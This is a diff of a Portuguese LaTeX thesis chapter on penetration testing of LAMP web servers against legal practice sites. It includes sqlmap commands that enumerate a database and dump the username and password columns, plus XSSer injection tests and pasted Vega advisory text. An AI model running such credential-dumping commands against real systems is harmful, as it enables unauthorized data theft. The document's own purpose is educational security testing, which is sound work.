@@ -303,6 +303,7 @@ testes de intrusão. Portanto, algumas ferramentas serão descritas e futuramente 
 
 
 \subsection{PRINCIPAIS ATAQUES}
+\label{principaisataques}
 
 Ataques direcionados a servidores baseados em \ac{LAMP} tem como objetivo explorar as vulnerabilidades das aplicações. Geralmente ataques são confundidos com vulnerabilidades, porém
 os mesmos não são sinônimos, ataque é algo que o atacante realiza e não uma falha do sistema. Alguns dos principais ataques serão apresentados, bem como sua descrição e os problemas
@@ -380,6 +381,7 @@ foi desenvolvido para necessidades específicas, usuários que não conhecem/utiliz
 
 
 \subsection{FERRAMENTAS PARA ANÁLISE DO LAMP}
+\label{ferramentas}
 
 Ferramentas para análise do \ac{LAMP} são acessórios que facilitam ao se procurar por vulnerabilidades. Nesta seção apresentar-se-á algumas dessas ferramentas, descrevendo-as 
 e informando algumas características específicas, todas as ferramentas aqui apresentadas estão disponibilizadas sem custo e nativamente quando instalado o sistema operacional 
@@ -422,7 +424,7 @@ Entretanto, mesmo com esta ferramenta proporcionando várias funcionalidades, nec
 Uma ferramenta que pode facilitar na hora de realizar ataques de \ac{XSS} é a ferramenta XSSer, a qual é automizada para detectar, explorar e reportar vulnerabilidades de \ac{XSS} em 
 aplicações \textit{web}. Para utilizar desta ferramenta é necessário ter a linguagem Python instalada e algumas bibliotecas específicas.
 
-Na Fig.~\ref{xsser} têm-se um exemplo do funcionamento da ferramenta XSSer.
+Na figura \ref{fig:xsser} têm-se um exemplo do funcionamento da ferramenta XSSer.
 
 \begin{figure}[H]
 \centering
@@ -446,89 +448,215 @@ para que haja um aproveitamento máximo dos testes de penetração.
 \label{ataques}
 
 Neste capítulo será apresentado os ataques realizados e algumas análises dos mesmos, bem como possíveis soluções para os problemas encontrados. Para a realização dos ataques será 
-utilizado algumas ferramentas auxiliares, como: Vega, sqlmap (ver seção~\ref{lampkali} para mais detalhes).
+utilizado algumas ferramentas auxiliares, como: \textit{Vega}, \textit{sqlmap} e \textit{XSSer} (ver seção~\ref{lampkali} para mais detalhes).
 
 \section{AMBIENTE DE TESTES E PLANO DE TESTES}
 
-Todos os testes aqui apresentados foi executado em \textit{sites} 
+Todos os testes aqui apresentados foram executados em \textit{sites} próprios para testes de penetração, ou seja, são \textit{sites} próprios para que sejam feitos os devidos 
+testes e com isso aprimorar habilidades sem nenhum tipo de dano a terceiros. Estes \textit{sites} são disponibilizados pela \cite{OWASP38:online},
+são eles: \url{www.testphp.vulnweb.com} e \url{www.hackthissite.org}.
+
+Também foram realizados testes com auxílio de ferramentas específicas para cada tipo de ataque (comentado em \ref{principaisataques}). 
+
 
 \section{SESSÃO DE ATAQUES}
 
-\begin{lstlisting}[style=BashInputStyle]
-    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
-    -D acuart -T users --columns
-\end{lstlisting}
+Viabilizada por ferramentas \textit{open-source} já citadas em \ref{ferramentas}, a sessão de ataques seguiu a seguinte ordem lógica: 
+\begin{enumerate}
+ \item Análise das vulnerabilidades com o \textit{Vega};
+ \item Utilização do \textit{sqlmap} para execução de \textit{SQL Injection}; e
+ \item Utilização do \textit{XSSer} para execução de \textit{Cross Site Scripting}.
+\end{enumerate}
 
+\subsection{Análise de Vulnerabilidade com \textit{Vega}}
+
+As figuras \ref{fig:vega_hack} e \ref{fig:vega_acuart} representam as vulnerabilidades encontradas quando utilizado do \textit{Vega Scan}
+(ver \ref{ferramentas} para mais detalhes).
 
 \begin{figure}[H]
 \centering
-\includegraphics[width=0.8\textwidth]{imagens/sqlmap_columnsnames_acuart.png}
-\caption{Nome das colunas de um \ac{BD}. Fonte: Próprio autor}
-\label{fig:XSS}
+\includegraphics[width=0.8\textwidth]{imagens/vegascan_hackthissite.png}
+\caption{Vulnerabilidades do site: hackthissite.org. Fonte: Próprio autor}
+\label{fig:vega_hack}
 \end{figure}
 
-\begin{lstlisting}[style=BashInputStyle]
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/vegascan_acuart.png}
+\caption{Vulnerabilidades do site: testphp.vulnweb.com. Fonte: Próprio autor}
+\label{fig:vega_acuart}
+\end{figure}
+
+O \textit{Vega} realiza então a classificação das ameaças como sendo de risco alto, médio ou baixo. Tendo então detectado um total de 
+1535 ameaças em \url{www.hackthissite.org} e 54 ameaças em \url{www.testphp.vulnweb.com}.
+
+\subsection{Ataques de \textit{SQL Injection}}\label{subsec:sql_injection}
+
+De acordo com a análise do \textit{Vega} dentre as 54 ameaças encontradas em \url{www.testphp.vulnweb.com} (figura \ref{fig:vega_acuart})
+existem 7 possíveis endereços vulneráveis à \textit{SQL Injection} e um dos possíveis endereços pode ser visualizado na figura 
+\ref{fig:vega_sqlinjection_acuart}.
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/vegascan_sqlinjection_acuart.png}
+\caption{Endereço vulnerável em testphp.vulnweb.com. Fonte: Próprio autor}
+\label{fig:vega_sqlinjection_acuart}
+\end{figure}
+
+Após obter através do \textit{Vega} o endereço onde será realizado o ataque, o próximo passo fora a utilização do \textit{sqlmap}
+para obter inicialmente o nome dos bancos de dados disponíveis.
+
+\begin{lstlisting}[caption={Comando para retornar a lista de bancos disponíveis},label={lst:db_disponivel},style=BashInputStyle]
     $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
     --dbs --threads 3
 \end{lstlisting}
+
+Com o comando \ref{lst:db_disponivel} é possível obter a lista dos bancos de dados, como visto na figura \ref{fig:sqlmap_dbnames}.
 
 
 \begin{figure}[H]
 \centering
 \includegraphics[width=0.8\textwidth]{imagens/sqlmap_dbnames_acuart.png}
 \caption{Nome dos \ac{BD}. Fonte: Próprio autor}
-\label{fig:XSS}
+\label{fig:sqlmap_dbnames}
 \end{figure}
 
-\begin{lstlisting}[style=BashInputStyle]
-    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
-    --dbs --threads 3
-\end{lstlisting}
+Dentre os nomes identificados tem-se o banco \textit{information\_schema}, o qual costuma ser um banco de dados padrão do sistema. Logo, o foco
+dos ataques será o banco \textit{acuart}. Para isso executa-se então o comando \ref{lst:tables}.
 
-\begin{figure}[H]
-\centering
-\includegraphics[width=0.8\textwidth]{imagens/sqlmap_tablenames2_acuart.png}
-\caption{Nome das tabelas no \ac{BD}. Fonte: Próprio autor}
-\label{fig:XSS}
-\end{figure}
-
-\begin{lstlisting}[style=BashInputStyle]
+\begin{lstlisting}[caption={Comando para retornar a lista de tabelas},label={lst:tables},style=BashInputStyle]
     $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
     --tables --threads 3
 \end{lstlisting}
 
+A figura \ref{fig:sqlmap_tablenames2} exemplifica o retorno da operação realizada.
+
+
 \begin{figure}[H]
 \centering
-\includegraphics[width=0.8\textwidth]{imagens/sqlmap_tablenames_acuart.png}
-\caption{. Fonte: Próprio autor}
-\label{fig:XSS}
+\includegraphics[width=0.4\textwidth]{imagens/sqlmap_tablenames2_acuart.png}
+\caption{Nome das tabelas no \ac{BD}. Fonte: Próprio autor}
+\label{fig:sqlmap_tablenames2}
 \end{figure}
 
-\begin{lstlisting}[style=BashInputStyle]
+Tendo então o nome das tabelas, é possível adicionar mais parâmetros ao comando \textit{sqlmap} para obter as colunas de uma determinada tabela,
+por exemplo. Simulando um sistema onde o banco de dados possui usuários cadastrados, é possível visualizar o nome \textit{users}, uma tabela
+promissora para conter o nome de usuário e senha para um possível \textit{login}.
+
+
+\begin{lstlisting}[caption={Comando para retornar as colunas da tabela users},label={lst:columns},style=BashInputStyle]
     $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
-    --threads 3 -D acuart -T users -C pass --dump
+    -D acuart -T users --columns
 \end{lstlisting}
 
+Verificar os campos (colunas) dessa tabela com \textit{sqlmap} é fácil com o comando \ref{lst:columns}, sendo o resultado apresentado 
+na figura \ref{fig:sqlmap_columnsnames}.
+
 \begin{figure}[H]
 \centering
-\includegraphics[width=0.8\textwidth]{imagens/sqlmap_pass_acuart.png}
-\caption{. Fonte: Próprio autor}
-\label{fig:XSS}
+\includegraphics[width=0.3\textwidth]{imagens/sqlmap_columnsnames_acuart.png}
+\caption{Nome das colunas de um \ac{BD}. Fonte: Próprio autor}
+\label{fig:sqlmap_columnsnames}
 \end{figure}
 
-\begin{lstlisting}[style=BashInputStyle]
+Neste retorno observa-se os campos \textit{uname} e \textit{pass}, os quais provavelmente contém nome de usuário e senha para acesso ao perfil
+do usuário.
+
+Para verificar estes valores tem-se os comandos \ref{lst:dump_uname} e \ref{lst:dump_pass}. O retorno desses comandos estão expostos nas figuras
+\ref{fig:dump_uname} e \ref{fig:dump_pass} respectivamente.
+
+\begin{lstlisting}[caption={Comando para retornar os valores da coluna \textit{uname}},label={lst:dump_uname},style=BashInputStyle]
     $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
     --threads 3 -D acuart -T users -C uname --dump
 \end{lstlisting}
 
+\begin{lstlisting}[caption={Comando para retornar os valores da coluna \textit{pass}},label={lst:dump_pass},style=BashInputStyle]
+    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
+    --threads 3 -D acuart -T users -C pass --dump
+\end{lstlisting}
+
+
 \begin{figure}[H]
 \centering
 \includegraphics[width=0.8\textwidth]{imagens/sqlmap_uname_acuart.png}
-\caption{. Fonte: Próprio autor}
-\label{fig:XSS}
+\caption{\textit{Dump} do campo \textit{uname} da tabela \textit{users} com \textit{sqlmap}. Fonte: Próprio autor}
+\label{fig:dump_uname}
 \end{figure}
 
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/sqlmap_pass_acuart.png}
+\caption{\textit{Dump} do campo \textit{pass} da tabela \textit{users} com \textit{sqlmap}. Fonte: Próprio autor}
+\label{fig:dump_pass}
+\end{figure}
+
+A partir da integração entre análise de vulnerabilidade e ataques de teste foi possível obter os nomes de usuário e suas respectivas
+senhas de acesso ao endereço \url{www.testphp.vulnweb.com}.
+
+\subsection{Ataques de \textit{Cross Site Scripting}}\label{subsec:xss}
+
+De acordo com a análise do \textit{Vega} dentre as 1535 ameaças encontradas em \url{www.hackthissite.org} (figura \ref{fig:vega_hack})
+existem 23 possíveis endereços vulneráveis à \textit{Cross Site Scripting}. Os próximos passos se dão com o uso do \textit{XSSer}.
+
+Através do endereço vulnerável disponibilizado pelo \textit{Vega} em sua análise de vulnerabilidade, inicia-se o \textit{XSSer} para iniciar
+os testes de inserção de \textit{scripts}. Inúmeros casos de teste são executados, como é possível observar na figura \ref{fig:xss_hack}.
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/xsser_xss_hackthissite.png}
+\caption{\textit{Scripts} inseridos em testes com \textit{XSSer}. Fonte: Próprio autor}
+\label{fig:xss_hack}
+\end{figure}
+
+Ao final da execução, o \textit{XSSer} fornece dados estatísticos com relação aos testes realizados (figura \ref{fig:math_hack}).
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/xsser_estatistica_hackthissite.png}
+\caption{Dados estatísticos dos testes com \textit{XSSer}. Fonte: Próprio autor}
+\label{fig:math_hack}
+\end{figure}
+
+Diferente da coleta de dados restritos observada em \ref{subsec:sql_injection}, os testes de inserção com \textit{XSSer} modificam a página
+com \textit{scripts} de outra origem que não o servidor de \url{www.hackthissite.org}.
+
 \section{ANÁLISE DOS RESULTADOS}
+
+A detecção das vulnerabilidades pelo \textit{Vega} permitem a manipulação do banco de dados (vide \ref{subsec:sql_injection}) e a inserção
+de \textit{scripts} maliciosos e de origem desconhecida (vide \ref{subsec:xss}) por atacantes que podem se prover de acesso de escrita e leitura
+para dados que não deveria ter permissão (\textit{SQL })
+
+Vega has detected a possible SQL injection vulnerability. These vulnerabilities are present when externally-supplied input is used to 
+construct a SQL query. If precautions are not taken, the externally-supplied input (usually a GET or POST parameter) can modify the 
+query string such that it performs unintented actions. These actions include gaining unauthorized read or write access to the data 
+stored in the database, as well as modifying the logic of the application.
+IMPACT
+
+Vega has detected a possible SQL injection vulnerability.
+These vulnerabilities can be exploited by remote attackers to gain unauthorized read or write access to the underlying database.
+Exploitation of SQL injection vulnerabilities can also allow for attacks against the logic of the application.
+Attackers may be able to obtain unauthorized access to the server hosting the database.
+
+
+DISCUSSION
+
+Cross-site scripting (XSS) is a class of vulnerabilities affecting web applications that can result in security controls implemented 
+in browsers being circumvented. When a browser visits a page on a website, script code originating in the website domain can access and 
+manipulate the DOM (document object model), a representation of the page and its properties in the browser. Script code from another website 
+can not. This is known as the "same origin policy", a critical control in the browser security model. Cross-site scripting vulnerabilities 
+occur when a lack of input validation permits users to inject script code into the target website such that it runs in the browser of another 
+user who is visiting the same website. This would circumvent the browser same-origin policy because the browser has no way to distinguish 
+authentic script code from inauthentic, apart from its origin.
+
+IMPACT
+
+The precise impact depends greatly on the application.
+XSS is generally a threat to web applications which have authenticated users or are otherwise security sensitive.
+Malicious code may be able to manipulate the content of the site, changing its appearance and/or function for another user.
+This includes modifying the behavior of the web application (such as redirecting forms, etc).
+The code may also be able to perform actions within the application without user knowledge.
+Script code can also obtain and retransmit cookie values if they haven't been set HttpOnly.
 
 \section{SOLUÇÕES PROPOSTAS}
 
